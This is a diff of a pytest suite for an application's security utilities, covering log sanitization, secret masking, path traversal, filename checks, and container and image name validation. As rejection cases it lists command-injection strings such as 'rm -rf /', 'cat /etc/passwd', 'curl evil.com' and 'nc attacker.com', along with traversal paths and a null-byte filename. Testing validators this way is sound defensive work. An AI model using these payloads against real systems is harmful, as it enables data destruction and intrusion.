@@ -1,15 +1,14 @@
 """Tests for security utilities (app/utils/security.py).
 
-Tests input sanitization and validation to prevent security vulnerabilities:
-- Log injection prevention via sanitize_log_message()
-- Path traversal detection in sanitize_path()
-- Sensitive data masking for logs
+Tests security and input validation utilities:
+- Log injection prevention
+- Sensitive data masking
+- Path traversal prevention
+- Filename validation
 - Container/image name validation
-- Filename safety checks
 """
 
 import pytest
-import tempfile
 from pathlib import Path
 
 from app.utils.security import (
@@ -23,481 +22,479 @@ from app.utils.security import (
 
 
 class TestSanitizeLogMessage:
-    """Test suite for log injection prevention."""
+    """Test suite for sanitize_log_message() function."""
 
     def test_removes_newlines(self):
-        """Test sanitize_log_message() removes newline characters."""
-        message = "Container\\nmalicious\\nlog"
-        sanitized = sanitize_log_message(message)
-
-        assert "\\n" not in sanitized
-        assert sanitized == "Containermaliciouslog"
-
-    def test_removes_carriage_returns(self):
-        """Test sanitize_log_message() removes carriage returns."""
-        message = "User: admin\\r\\nPassword: secret"
-        sanitized = sanitize_log_message(message)
-
-        assert "\\r" not in sanitized
-        assert "\\n" not in sanitized
-        assert sanitized == "User: adminPassword: secret"
+        """Test removes newline characters."""
+        assert sanitize_log_message("Line1\nLine2") == "Line1Line2"
+        assert sanitize_log_message("Line1\r\nLine2") == "Line1Line2"
+        assert sanitize_log_message("Line1\rLine2") == "Line1Line2"
 
     def test_removes_tabs(self):
-        """Test sanitize_log_message() removes tab characters."""
-        message = "field1\\tfield2\\tfield3"
-        sanitized = sanitize_log_message(message)
-
-        assert "\\t" not in sanitized
-        assert sanitized == "field1field2field3"
+        """Test removes tab characters."""
+        assert sanitize_log_message("Word1\tWord2") == "Word1Word2"
 
     def test_removes_control_characters(self):
-        """Test sanitize_log_message() removes control characters."""
-        # ASCII control characters (0x00-0x1f)
-        message = "text\\x00null\\x01control\\x1fmore"
-        sanitized = sanitize_log_message(message)
+        """Test removes ASCII control characters (0x00-0x1f)."""
+        # Null byte
+        assert sanitize_log_message("Text\x00Here") == "TextHere"
+        # Bell character
+        assert sanitize_log_message("Alert\x07Here") == "AlertHere"
+        # Escape character
+        assert sanitize_log_message("Esc\x1bHere") == "EscHere"
 
-        # Should only contain printable characters
-        assert "\\x00" not in sanitized
-        assert "\\x01" not in sanitized
-        assert "\\x1f" not in sanitized
+    def test_removes_delete_and_high_control_chars(self):
+        """Test removes delete and high control characters (0x7f-0x9f)."""
+        assert sanitize_log_message("Text\x7fHere") == "TextHere"
+        assert sanitize_log_message("Text\x9fHere") == "TextHere"
 
     def test_preserves_normal_text(self):
-        """Test sanitize_log_message() preserves normal text."""
-        message = "Normal log message with spaces and punctuation!"
-        sanitized = sanitize_log_message(message)
+        """Test preserves normal alphanumeric text."""
+        assert sanitize_log_message("Hello World") == "Hello World"
+        assert sanitize_log_message("123 Test ABC") == "123 Test ABC"
 
-        assert sanitized == message
+    def test_preserves_special_characters(self):
+        """Test preserves allowed special characters."""
+        assert sanitize_log_message("Test: @#$%^&*()") == "Test: @#$%^&*()"
+        assert sanitize_log_message("Path/to/file.txt") == "Path/to/file.txt"
 
     def test_handles_none_input(self):
-        """Test sanitize_log_message() handles None input."""
+        """Test handles None input gracefully."""
         assert sanitize_log_message(None) == ""
 
+    def test_converts_int_to_string(self):
+        """Test converts integer to string."""
+        assert sanitize_log_message(12345) == "12345"
+        assert sanitize_log_message(0) == "0"
+
+    def test_converts_float_to_string(self):
+        """Test converts float to string."""
+        assert sanitize_log_message(3.14) == "3.14"
+
+    def test_converts_bytes_to_string(self):
+        """Test converts bytes to string."""
+        assert sanitize_log_message(b"Hello") == "b'Hello'"
+
+    def test_prevents_log_injection(self):
+        """Test prevents log injection attack."""
+        malicious = "User login successful\nUser: admin\nPassword: secret"
+        sanitized = sanitize_log_message(malicious)
+        assert "\n" not in sanitized
+        assert sanitized == "User login successfulUser: adminPassword: secret"
+
+    def test_prevents_log_forging(self):
+        """Test prevents log entry forging."""
+        # Attacker tries to inject fake log entries
+        malicious = "Normal log\n[ERROR] Fake error injected\n[INFO] Fake info"
+        sanitized = sanitize_log_message(malicious)
+        assert "\n" not in sanitized
+
     def test_handles_empty_string(self):
-        """Test sanitize_log_message() handles empty string."""
+        """Test handles empty string."""
         assert sanitize_log_message("") == ""
 
-    def test_handles_numeric_input(self):
-        """Test sanitize_log_message() converts numbers to strings."""
-        assert sanitize_log_message(123) == "123"
-        assert sanitize_log_message(45.67) == "45.67"
-
-    def test_handles_bytes_input(self):
-        """Test sanitize_log_message() handles bytes input."""
-        message = b"byte string"
-        sanitized = sanitize_log_message(message)
-
-        assert isinstance(sanitized, str)
-        assert sanitized == "b'byte string'"
-
-    def test_prevents_log_injection_attacks(self):
-        """Test sanitize_log_message() prevents log injection."""
-        # Attacker tries to inject fake log entries
-        malicious = "Valid log\\n[ERROR] Fake error message\\n[CRITICAL] System compromised"
-        sanitized = sanitize_log_message(malicious)
-
-        # All newlines removed - appears as single line
-        assert "\\n" not in sanitized
-        assert sanitized.count("[ERROR]") == 1
-        assert sanitized.count("[CRITICAL]") == 1
-
-    def test_removes_ansi_escape_codes(self):
-        """Test sanitize_log_message() removes ANSI escape codes."""
-        # ANSI escape codes use control characters
-        message = "\\x1b[31mRed text\\x1b[0m"
-        sanitized = sanitize_log_message(message)
-
-        assert "\\x1b" not in sanitized
-
-    def test_long_messages(self):
-        """Test sanitize_log_message() handles long messages."""
-        long_message = "x" * 10000 + "\\n" + "y" * 10000
-        sanitized = sanitize_log_message(long_message)
-
-        assert "\\n" not in sanitized
-        assert len(sanitized) == 20000
+    def test_handles_unicode(self):
+        """Test preserves Unicode characters."""
+        assert sanitize_log_message("Hello 世界 🌍") == "Hello 世界 🌍"
 
 
 class TestMaskSensitive:
-    """Test suite for sensitive data masking."""
+    """Test suite for mask_sensitive() function."""
 
-    def test_masks_api_key_shows_last_4(self):
-        """Test mask_sensitive() shows only last 4 characters."""
-        api_key = "sk_live_1234567890abcdef"
-        masked = mask_sensitive(api_key)
+    def test_masks_api_key(self):
+        """Test masks API key showing last 4 chars."""
+        assert mask_sensitive("sk_live_1234567890abcdef") == "***cdef"
 
-        assert masked == "***cdef"
+    def test_masks_password(self):
+        """Test masks password."""
+        assert mask_sensitive("SuperSecret123!", visible_chars=3) == "***23!"
 
-    def test_masks_with_custom_visible_chars(self):
-        """Test mask_sensitive() with custom visible character count."""
-        value = "password123"
-        masked = mask_sensitive(value, visible_chars=3)
+    def test_masks_short_value_completely(self):
+        """Test masks value completely when shorter than visible_chars."""
+        assert mask_sensitive("abc", visible_chars=4) == "***"
+        assert mask_sensitive("1234", visible_chars=5) == "***"
 
-        assert masked == "***123"
+    def test_masks_equal_length_value(self):
+        """Test masks value equal to visible_chars."""
+        assert mask_sensitive("1234", visible_chars=4) == "***"
 
-    def test_masks_short_values_completely(self):
-        """Test mask_sensitive() masks short values completely."""
-        short_values = ["abc", "12", "x", ""]
-
-        for value in short_values:
-            masked = mask_sensitive(value, visible_chars=4)
-            assert masked == "***"
-
-    def test_masks_none_value(self):
-        """Test mask_sensitive() handles None."""
-        assert mask_sensitive(None) == "***"
-
-    def test_masks_empty_string(self):
-        """Test mask_sensitive() handles empty string."""
+    def test_handles_empty_string(self):
+        """Test handles empty string."""
         assert mask_sensitive("") == "***"
 
-    def test_masks_with_custom_mask_character(self):
-        """Test mask_sensitive() with custom mask character."""
-        value = "secret123456"
-        masked = mask_sensitive(value, mask_char="X")
+    def test_handles_none(self):
+        """Test handles None value."""
+        assert mask_sensitive(None) == "***"
 
-        assert masked == "XXX3456"
+    def test_custom_visible_chars(self):
+        """Test custom number of visible characters."""
+        assert mask_sensitive("1234567890", visible_chars=2) == "***90"
+        assert mask_sensitive("1234567890", visible_chars=6) == "***567890"
 
-    def test_never_shows_beginning_of_secret(self):
-        """Test mask_sensitive() never reveals start of secret."""
-        secrets = [
-            "ghp_1234567890abcdefghij",
-            "dckr_pat_abcdefghij",
-            "key_with_prefix_12345",
+    def test_custom_mask_character(self):
+        """Test custom mask character."""
+        assert mask_sensitive("sk_live_1234567890abcdef", visible_chars=4, mask_char="X") == "XXXcdef"
+        assert mask_sensitive("password", visible_chars=3, mask_char="#") == "###ord"
+
+    def test_never_shows_beginning(self):
+        """Test never shows beginning of secrets (highest entropy)."""
+        result = mask_sensitive("sk_live_very_secret_key_12345")
+        assert not result.startswith("sk")
+        assert result.endswith("2345")
+
+    def test_safe_for_logging(self):
+        """Test output is safe for logging."""
+        sensitive_values = [
+            "ghp_1234567890abcdefghij",  # GitHub token
+            "xoxb-1234567890-abcdef",     # Slack token
+            "AIzaSyABC123_xyz",           # Google API key
         ]
-
-        for secret in secrets:
-            masked = mask_sensitive(secret)
-            # Should not contain first 10 characters
-            assert secret[:10] not in masked
-
-    def test_realistic_sensitive_data(self):
-        """Test mask_sensitive() with realistic sensitive data."""
-        test_cases = {
-            "dockerhub_token": "dckr_pat_1234567890abcdefghij",
-            "github_token": "ghp_1234567890abcdefghijklmnopqrstuvwxyz",
-            "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature",
-            "api_key": "sk_live_51Hx1234567890",
-        }
-
-        for name, secret in test_cases.items():
-            masked = mask_sensitive(secret)
-            assert len(masked) == 7  # *** + 4 chars
+        for value in sensitive_values:
+            masked = mask_sensitive(value)
             assert masked.startswith("***")
+            assert len(masked) <= len(value)
 
 
 class TestSanitizePath:
-    """Test suite for path traversal prevention."""
+    """Test suite for sanitize_path() function."""
 
-    def test_allows_valid_path_within_base(self):
-        """Test sanitize_path() allows valid paths."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
+    def test_allows_path_within_base_dir(self, tmp_path):
+        """Test allows valid path within base directory."""
+        (tmp_path / "data").mkdir()
+        (tmp_path / "data" / "file.txt").write_text("content")
 
-            user_path = "data/compose.yml"
-            result = sanitize_path(user_path, base)
+        result = sanitize_path("data/file.txt", tmp_path)
 
-            assert result.is_relative_to(base)
-            assert result.name == "compose.yml"
+        assert result == tmp_path / "data" / "file.txt"
 
-    def test_blocks_parent_directory_traversal(self):
-        """Test sanitize_path() blocks ../ attacks."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
+    def test_resolves_relative_path(self, tmp_path):
+        """Test resolves relative path correctly."""
+        (tmp_path / "subdir").mkdir()
 
-            with pytest.raises(ValueError) as exc_info:
-                sanitize_path("../../etc/passwd", base)
+        result = sanitize_path("subdir", tmp_path)
 
-            assert "Path traversal detected" in str(exc_info.value)
+        assert result == tmp_path / "subdir"
 
-    def test_blocks_absolute_path_outside_base(self):
-        """Test sanitize_path() blocks absolute paths outside base."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
+    def test_rejects_path_traversal_with_dotdot(self, tmp_path):
+        """Test rejects path traversal using .."""
+        with pytest.raises(ValueError, match="Path traversal detected"):
+            sanitize_path("../../etc/passwd", tmp_path)
 
-            with pytest.raises(ValueError) as exc_info:
-                sanitize_path("/etc/passwd", base)
+    def test_rejects_absolute_path_outside_base(self, tmp_path):
+        """Test rejects absolute path outside base directory."""
+        with pytest.raises(ValueError, match="Path traversal detected"):
+            sanitize_path("/etc/passwd", tmp_path)
 
-            assert "Path traversal detected" in str(exc_info.value)
+    def test_rejects_symlink_when_disallowed(self, tmp_path):
+        """Test rejects symbolic links when allow_symlinks=False."""
+        target = tmp_path / "target.txt"
+        target.write_text("content")
 
-    def test_blocks_symlink_escape(self):
-        """Test sanitize_path() blocks symlink escapes."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
+        symlink = tmp_path / "link.txt"
+        symlink.symlink_to(target)
 
-            # Create symlink pointing outside base
-            link_path = base / "evil_link"
-            link_path.symlink_to("/etc")
+        with pytest.raises(ValueError, match="Symbolic links not allowed"):
+            sanitize_path("link.txt", tmp_path, allow_symlinks=False)
 
-            with pytest.raises(ValueError) as exc_info:
-                sanitize_path("evil_link", base, allow_symlinks=False)
+    def test_allows_symlink_when_enabled(self, tmp_path):
+        """Test allows symbolic links when allow_symlinks=True."""
+        target = tmp_path / "target.txt"
+        target.write_text("content")
 
-            assert "Symbolic links not allowed" in str(exc_info.value)
+        symlink = tmp_path / "link.txt"
+        symlink.symlink_to(target)
 
-    def test_allows_symlink_when_enabled(self):
-        """Test sanitize_path() allows symlinks when configured."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
+        result = sanitize_path("link.txt", tmp_path, allow_symlinks=True)
 
-            # Create symlink within base
-            target = base / "target.txt"
-            target.write_text("content")
-            link = base / "link.txt"
-            link.symlink_to(target)
+        # Result is the resolved target path
+        assert result == target.resolve()
 
-            result = sanitize_path("link.txt", base, allow_symlinks=True)
+    def test_raises_on_nonexistent_base_dir(self, tmp_path):
+        """Test raises FileNotFoundError when base_dir doesn't exist."""
+        with pytest.raises(FileNotFoundError, match="Base directory does not exist"):
+            sanitize_path("file.txt", tmp_path / "nonexistent")
 
-            assert result.exists()
+    def test_handles_path_object_input(self, tmp_path):
+        """Test handles Path object as input."""
+        (tmp_path / "file.txt").write_text("content")
 
-    def test_resolves_relative_paths(self):
-        """Test sanitize_path() resolves ./ and ../ correctly."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
-            (base / "subdir").mkdir()
+        result = sanitize_path(Path("file.txt"), tmp_path)
 
-            # This should be allowed (stays within base)
-            result = sanitize_path("./subdir/../subdir/file.txt", base)
+        assert result == tmp_path / "file.txt"
 
-            assert result.is_relative_to(base)
+    def test_prevents_path_traversal_with_encoded_dots(self, tmp_path):
+        """Test prevents path traversal with URL-encoded dots."""
+        # Note: Path.resolve() will normalize these, but they still resolve outside base
+        with pytest.raises(ValueError, match="Path traversal"):
+            sanitize_path("data/../../etc/passwd", tmp_path)
 
-    def test_raises_on_nonexistent_base(self):
-        """Test sanitize_path() raises if base directory doesn't exist."""
-        with pytest.raises(FileNotFoundError):
-            sanitize_path("file.txt", "/nonexistent/base/directory")
+    def test_handles_nonexistent_target_path(self, tmp_path):
+        """Test handles target path that doesn't exist yet (for creation)."""
+        # Should succeed even if file doesn't exist yet
+        result = sanitize_path("newfile.txt", tmp_path)
 
-    def test_handles_path_object_input(self):
-        """Test sanitize_path() accepts Path objects."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
-
-            user_path = Path("data/file.txt")
-            result = sanitize_path(user_path, base)
-
-            assert isinstance(result, Path)
-            assert result.is_relative_to(base)
-
-    def test_blocks_null_byte_injection(self):
-        """Test sanitize_path() handles null byte injection."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
-
-            # Null byte can truncate path in some systems
-            with pytest.raises((ValueError, OSError)):
-                sanitize_path("safe.txt\\x00../../etc/passwd", base)
+        assert result == tmp_path / "newfile.txt"
 
 
 class TestIsSafeFilename:
-    """Test suite for filename validation."""
+    """Test suite for is_safe_filename() function."""
 
-    def test_allows_normal_filename(self):
-        """Test is_safe_filename() allows normal filenames."""
+    def test_allows_simple_filename(self):
+        """Test allows simple alphanumeric filename."""
         assert is_safe_filename("document.pdf") is True
-        assert is_safe_filename("image_2024.png") is True
-        assert is_safe_filename("my-file.txt") is True
+        assert is_safe_filename("file123.txt") is True
 
-    def test_blocks_path_separators(self):
-        """Test is_safe_filename() blocks path separators."""
-        assert is_safe_filename("../../../etc/passwd") is False
-        assert is_safe_filename("subdir/file.txt") is False
-        assert is_safe_filename("dir\\\\file.txt") is False
+    def test_allows_filename_with_extension(self):
+        """Test allows filename with extension."""
+        assert is_safe_filename("report.docx") is True
+        assert is_safe_filename("image.jpg") is True
 
-    def test_blocks_null_bytes(self):
-        """Test is_safe_filename() blocks null bytes."""
-        assert is_safe_filename("file\\x00.txt") is False
-
-    def test_blocks_control_characters(self):
-        """Test is_safe_filename() blocks control characters."""
-        assert is_safe_filename("file\\n.txt") is False
-        assert is_safe_filename("file\\r.txt") is False
-        assert is_safe_filename("file\\t.txt") is False
-
-    def test_allows_hidden_files_by_default(self):
-        """Test is_safe_filename() allows hidden files."""
+    def test_allows_hidden_file_by_default(self):
+        """Test allows hidden files (starting with .) by default."""
         assert is_safe_filename(".htaccess") is True
-        assert is_safe_filename(".env") is True
+        assert is_safe_filename(".gitignore") is True
 
-    def test_blocks_hidden_files_when_configured(self):
-        """Test is_safe_filename() blocks hidden files when configured."""
+    def test_rejects_hidden_file_when_disallowed(self):
+        """Test rejects hidden files when allow_dots=False."""
         assert is_safe_filename(".htaccess", allow_dots=False) is False
-        assert is_safe_filename(".env", allow_dots=False) is False
+        assert is_safe_filename(".config", allow_dots=False) is False
 
-    def test_blocks_special_directory_names(self):
-        """Test is_safe_filename() blocks . and ..."""
+    def test_rejects_path_with_forward_slash(self):
+        """Test rejects filename with forward slash (path separator)."""
+        assert is_safe_filename("../../../etc/passwd") is False
+        assert is_safe_filename("dir/file.txt") is False
+
+    def test_rejects_path_with_backslash(self):
+        """Test rejects filename with backslash (Windows path separator)."""
+        assert is_safe_filename("dir\\file.txt") is False
+        assert is_safe_filename("C:\\Windows\\System32") is False
+
+    def test_rejects_null_byte(self):
+        """Test rejects filename with null byte."""
+        assert is_safe_filename("file\x00.txt") is False
+
+    def test_rejects_control_characters(self):
+        """Test rejects filename with control characters."""
+        assert is_safe_filename("file\x01.txt") is False
+        assert is_safe_filename("file\x1f.txt") is False
+        assert is_safe_filename("file\x7f.txt") is False
+
+    def test_rejects_empty_string(self):
+        """Test rejects empty filename."""
+        assert is_safe_filename("") is False
+
+    def test_rejects_dot(self):
+        """Test rejects current directory (.)."""
         assert is_safe_filename(".") is False
+
+    def test_rejects_dotdot(self):
+        """Test rejects parent directory (..)."""
         assert is_safe_filename("..") is False
 
-    def test_blocks_empty_filename(self):
-        """Test is_safe_filename() blocks empty filename."""
-        assert is_safe_filename("") is False
-        assert is_safe_filename(None) is False
+    def test_allows_multiple_extensions(self):
+        """Test allows filename with multiple extensions."""
+        assert is_safe_filename("archive.tar.gz") is True
+
+    def test_allows_special_characters_in_filename(self):
+        """Test allows safe special characters."""
+        assert is_safe_filename("file-name_v2.txt") is True
+        assert is_safe_filename("report (final).pdf") is True
 
 
 class TestValidateContainerName:
-    """Test suite for Docker container name validation."""
+    """Test suite for validate_container_name() function."""
 
-    def test_allows_valid_container_names(self):
-        """Test validate_container_name() allows valid names."""
-        valid_names = [
-            "my-container",
-            "container_1",
-            "app-prod-v2",
-            "nginx",
-            "postgres-14",
-        ]
+    def test_validates_simple_name(self):
+        """Test validates simple alphanumeric container name."""
+        assert validate_container_name("mycontainer") == "mycontainer"
+        assert validate_container_name("app123") == "app123"
 
-        for name in valid_names:
-            assert validate_container_name(name) == name
+    def test_validates_name_with_hyphens(self):
+        """Test validates container name with hyphens."""
+        assert validate_container_name("my-container") == "my-container"
+        assert validate_container_name("web-server-01") == "web-server-01"
 
-    def test_blocks_path_traversal_in_container_name(self):
-        """Test validate_container_name() blocks path traversal."""
-        with pytest.raises(ValueError):
-            validate_container_name("../../etc")
+    def test_validates_name_with_underscores(self):
+        """Test validates container name with underscores."""
+        assert validate_container_name("my_container") == "my_container"
+        assert validate_container_name("app_v1_prod") == "app_v1_prod"
 
-    def test_blocks_invalid_characters(self):
-        """Test validate_container_name() blocks invalid characters."""
-        invalid_names = [
-            "container;rm -rf /",
-            "container && whoami",
-            "container | cat /etc/passwd",
-            "container`whoami`",
-            "container$(whoami)",
-        ]
+    def test_validates_name_with_dots(self):
+        """Test validates container name with dots."""
+        assert validate_container_name("my.container") == "my.container"
+        assert validate_container_name("app.v1.0") == "app.v1.0"
 
-        for name in invalid_names:
-            with pytest.raises(ValueError):
-                validate_container_name(name)
+    def test_validates_mixed_valid_chars(self):
+        """Test validates container name with mixed valid characters."""
+        assert validate_container_name("my-app_v1.0-prod") == "my-app_v1.0-prod"
 
-    def test_blocks_empty_name(self):
-        """Test validate_container_name() blocks empty name."""
-        with pytest.raises(ValueError) as exc_info:
+    def test_rejects_empty_name(self):
+        """Test rejects empty container name."""
+        with pytest.raises(ValueError, match="cannot be empty"):
             validate_container_name("")
 
-        assert "cannot be empty" in str(exc_info.value)
+    def test_rejects_name_starting_with_hyphen(self):
+        """Test rejects container name starting with hyphen."""
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name("-container")
 
-    def test_requires_alphanumeric_start(self):
-        """Test validate_container_name() requires alphanumeric first char."""
-        # Docker names must start with [a-zA-Z0-9]
-        with pytest.raises(ValueError):
-            validate_container_name("-invalid-start")
+    def test_rejects_name_starting_with_dot(self):
+        """Test rejects container name starting with dot."""
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name(".container")
 
-        with pytest.raises(ValueError):
-            validate_container_name("_invalid-start")
+    def test_rejects_path_traversal(self):
+        """Test rejects path traversal attempt."""
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name("../../../etc")
 
-    def test_allows_alphanumeric_and_special_chars(self):
-        """Test validate_container_name() allows alphanumeric, _, ., -."""
-        assert validate_container_name("valid_name-123.test") == "valid_name-123.test"
+    def test_rejects_name_with_slash(self):
+        """Test rejects container name with slash."""
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name("my/container")
+
+    def test_rejects_name_with_spaces(self):
+        """Test rejects container name with spaces."""
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name("my container")
+
+    def test_rejects_name_with_special_chars(self):
+        """Test rejects container name with invalid special characters."""
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name("container@host")
+        with pytest.raises(ValueError, match="Invalid container name"):
+            validate_container_name("my#container")
 
 
 class TestValidateImageName:
-    """Test suite for Docker image name validation."""
+    """Test suite for validate_image_name() function."""
 
-    def test_allows_simple_image_names(self):
-        """Test validate_image_name() allows simple names."""
-        valid_images = [
-            "nginx:latest",
-            "postgres:14",
-            "redis:alpine",
-        ]
+    def test_validates_simple_image(self):
+        """Test validates simple image name."""
+        assert validate_image_name("nginx") == "nginx"
+        assert validate_image_name("postgres") == "postgres"
 
-        for image in valid_images:
-            assert validate_image_name(image) == image
+    def test_validates_image_with_tag(self):
+        """Test validates image name with tag."""
+        assert validate_image_name("nginx:latest") == "nginx:latest"
+        assert validate_image_name("postgres:14.5") == "postgres:14.5"
 
-    def test_allows_registry_prefixed_images(self):
-        """Test validate_image_name() allows registry prefixes."""
-        valid_images = [
-            "ghcr.io/user/repo:v1.0.0",
-            "docker.io/library/nginx:latest",
-            "registry.example.com:5000/app:latest",
-        ]
+    def test_validates_image_with_registry(self):
+        """Test validates image name with registry."""
+        assert validate_image_name("docker.io/nginx:latest") == "docker.io/nginx:latest"
+        assert validate_image_name("ghcr.io/user/repo:v1.0.0") == "ghcr.io/user/repo:v1.0.0"
 
-        for image in valid_images:
-            assert validate_image_name(image) == image
+    def test_validates_image_with_namespace(self):
+        """Test validates image name with namespace."""
+        assert validate_image_name("library/nginx") == "library/nginx"
+        assert validate_image_name("myorg/myapp:v2") == "myorg/myapp:v2"
 
-    def test_allows_digest_references(self):
-        """Test validate_image_name() allows @digest references."""
-        image = "nginx@sha256:1234567890abcdef"
+    def test_validates_image_with_digest(self):
+        """Test validates image name with digest."""
+        assert validate_image_name("nginx@sha256:abc123") == "nginx@sha256:abc123"
+
+    def test_validates_complex_image_name(self):
+        """Test validates complex image name with all components."""
+        image = "registry.example.com:5000/myorg/myapp:v1.2.3-alpine"
         assert validate_image_name(image) == image
 
-    def test_blocks_path_traversal_in_image_name(self):
-        """Test validate_image_name() blocks path traversal."""
-        with pytest.raises(ValueError):
-            validate_image_name("../../etc/passwd")
-
-    def test_blocks_absolute_paths(self):
-        """Test validate_image_name() blocks absolute paths."""
-        with pytest.raises(ValueError):
-            validate_image_name("/etc/passwd")
-
-    def test_blocks_control_characters(self):
-        """Test validate_image_name() blocks control characters."""
-        with pytest.raises(ValueError):
-            validate_image_name("nginx\\n:latest")
-
-    def test_blocks_empty_name(self):
-        """Test validate_image_name() blocks empty name."""
-        with pytest.raises(ValueError):
+    def test_rejects_empty_image_name(self):
+        """Test rejects empty image name."""
+        with pytest.raises(ValueError, match="cannot be empty"):
             validate_image_name("")
 
-    def test_blocks_invalid_format(self):
-        """Test validate_image_name() blocks invalid formats."""
-        invalid_images = [
-            "nginx;rm -rf /",
-            "nginx && whoami",
-            "nginx | cat /etc/passwd",
-        ]
+    def test_rejects_path_traversal(self):
+        """Test rejects path traversal in image name."""
+        with pytest.raises(ValueError, match="Invalid image name"):
+            validate_image_name("../../etc/passwd")
 
-        for image in invalid_images:
+    def test_rejects_absolute_path(self):
+        """Test rejects absolute path in image name."""
+        with pytest.raises(ValueError, match="Invalid image name"):
+            validate_image_name("/etc/passwd")
+
+    def test_rejects_control_characters(self):
+        """Test rejects image name with control characters."""
+        with pytest.raises(ValueError, match="control characters"):
+            validate_image_name("nginx\x00:latest")
+
+    def test_rejects_image_starting_with_special_char(self):
+        """Test rejects image name starting with special character."""
+        with pytest.raises(ValueError, match="Invalid image name format"):
+            validate_image_name("-nginx")
+        with pytest.raises(ValueError, match="Invalid image name format"):
+            validate_image_name(":nginx")
+
+    def test_allows_underscores_in_image(self):
+        """Test allows underscores in image name."""
+        assert validate_image_name("my_app:latest") == "my_app:latest"
+
+    def test_allows_hyphens_in_image(self):
+        """Test allows hyphens in image name."""
+        assert validate_image_name("my-app:v1-rc1") == "my-app:v1-rc1"
+
+
+class TestSecurityEdgeCases:
+    """Test security edge cases and attack scenarios."""
+
+    def test_log_injection_with_ansi_escape_codes(self):
+        """Test prevents ANSI escape code injection in logs."""
+        malicious = "Normal log\x1b[31mRed text\x1b[0m"
+        sanitized = sanitize_log_message(malicious)
+        assert "\x1b" not in sanitized
+
+    def test_null_byte_truncation_attack(self):
+        """Test prevents null byte truncation in filenames."""
+        # Attacker tries to hide .php after null byte
+        assert is_safe_filename("innocent.txt\x00.php") is False
+
+    def test_path_traversal_multiple_levels(self):
+        """Test prevents deep path traversal."""
+        malicious_paths = [
+            "../../../../../../../etc/passwd",
+            "../../../../../../../../../../etc/passwd",
+            "data/../../../etc/passwd",
+        ]
+        tmp = Path("/tmp/test_base")
+        if not tmp.exists():
+            tmp.mkdir(parents=True)
+
+        try:
+            for path in malicious_paths:
+                with pytest.raises(ValueError, match="Path traversal"):
+                    sanitize_path(path, tmp)
+        finally:
+            if tmp.exists():
+                tmp.rmdir()
+
+    def test_unicode_normalization_attack(self):
+        """Test handles Unicode normalization (directory traversal variants)."""
+        # Some filesystems normalize Unicode, which can bypass filters
+        # These should still be caught by path validation
+        tmp = Path("/tmp/test_base")
+        if not tmp.exists():
+            tmp.mkdir(parents=True)
+
+        try:
+            # Unicode representation of ..
+            with pytest.raises(ValueError):
+                sanitize_path("\u002e\u002e/etc/passwd", tmp)
+        finally:
+            if tmp.exists():
+                tmp.rmdir()
+
+    def test_windows_path_separator_in_container_name(self):
+        """Test rejects Windows path separator in container name."""
+        with pytest.raises(ValueError):
+            validate_container_name("C:\\Users\\Admin")
+
+    def test_command_injection_in_image_name(self):
+        """Test prevents command injection in image name."""
+        malicious_images = [
+            "nginx; rm -rf /",
+            "nginx && curl evil.com",
+            "nginx | nc attacker.com",
+        ]
+        for image in malicious_images:
             with pytest.raises(ValueError):
                 validate_image_name(image)
-
-
-class TestSecurityIntegration:
-    """Integration tests for security utilities working together."""
-
-    def test_path_and_filename_validation_combined(self):
-        """Test combining path and filename validation."""
-        with tempfile.TemporaryDirectory() as tmpdir:
-            base = Path(tmpdir)
-            base.mkdir(exist_ok=True)
-
-            # Validate filename first
-            filename = "config.yml"
-            assert is_safe_filename(filename) is True
-
-            # Then validate path
-            full_path = sanitize_path(f"configs/{filename}", base)
-            assert full_path.name == filename
-
-    def test_log_sanitization_with_masked_data(self):
-        """Test logging with both sanitization and masking."""
-        api_key = "sk_live_1234567890abcdef"
-        message = f"API key: {mask_sensitive(api_key)}"
-
-        # Attacker tries to inject newlines
-        malicious_message = message + "\\n[ERROR] Fake error"
-        sanitized = sanitize_log_message(malicious_message)
-
-        # No newlines, and API key is masked
-        assert "\\n" not in sanitized
-        assert "***cdef" in sanitized
-        assert "sk_live_" not in sanitized
-
-    def test_container_name_in_log_message(self):
-        """Test validating container name before logging."""
-        container_name = "my-app-v1"
-
-        # Validate container name
-        validated_name = validate_container_name(container_name)
-
-        # Sanitize for logging
-        log_message = f"Container {validated_name} started"
-        sanitized = sanitize_log_message(log_message)
-
-        assert sanitized == log_message
